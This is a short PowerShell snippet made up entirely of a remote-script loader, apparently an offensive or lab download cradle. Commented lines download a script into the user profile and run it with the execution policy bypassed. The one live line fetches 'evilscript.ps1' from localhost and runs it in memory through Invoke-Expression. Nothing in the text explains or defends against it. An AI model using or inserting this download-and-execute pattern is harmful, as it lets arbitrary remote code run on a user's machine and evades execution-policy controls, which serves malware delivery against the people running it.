#$ScriptURL = ""
#$rand = Get-Random
#$webclient = New-Object System.Net.WebClient
#$file1 = "$env:UserProfile\$rand.ps1"
#$webclient.DownloadFile($ScriptURL,"$file1")
#$script:pastevalue = powershell.exe -ExecutionPolicy Bypass -noLogo -command $file1
#Invoke-Expression $pastevalue
Invoke-Expression ((New-Object Net.WebClient).DownloadString("http://localhost/evilscript.ps1"))